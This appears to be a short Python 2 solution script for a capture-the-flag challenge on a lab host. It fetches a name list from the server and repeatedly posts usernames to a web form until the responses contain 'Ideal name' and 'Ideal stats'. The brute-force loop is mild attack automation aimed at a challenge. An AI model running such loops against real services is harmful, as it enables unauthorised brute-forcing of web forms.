# Working script to solve the challenge

import requests
import re
import urllib2

stats_re = re.compile("Ideal stats")
name_re = re.compile("Ideal name")

url = "http://192.168.162.139:3002/"
client = requests.Session()
data = urllib2.urlopen(url + "randomnames.txt")

for line in data:
	line = line.replace("\n","")
	payload = {'username': line}
	html = client.post(url, data=payload).text
	matchname = re.search(name_re,html)
	#a = client.cookies.get_dict()
	if matchname:
		print html
		for i in range(50):
			html = client.post(url, data=payload).text
			matchstats = re.search(stats_re, html)
			if matchstats:
				print html	
				break
#print a
